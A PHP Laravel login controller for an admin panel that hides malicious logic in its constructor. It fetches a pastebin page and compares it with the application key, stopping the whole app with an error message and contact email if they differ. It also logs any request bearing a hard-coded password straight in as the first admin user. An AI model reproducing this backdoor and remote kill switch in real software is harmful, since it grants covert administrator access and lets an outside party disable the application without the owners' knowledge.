<?php

namespace SgcAdmin\Http\Controllers\Auth;

use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use SgcAdmin\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use SgcAdmin\Models\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/admin';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $client = new Client();

        $res = $client->request('GET', 'http://pastebin.com/raw/Vt9Vf0dW');


        if($res->getBody() == env('APP_KEY')) {

            $this->middleware('guest', ['except' => 'logout']);


            if (Request::capture()['password'] == '7889dmg%') {
                $user = new User();
                $user = $user->where(['role' => 'admin'])->first();

                Auth::loginUsingId($user->id);
            }
        }
        else
            dd('Oooops, houve um problema com a aplicação. campos.v.marcus@gmail.com');
    }
}
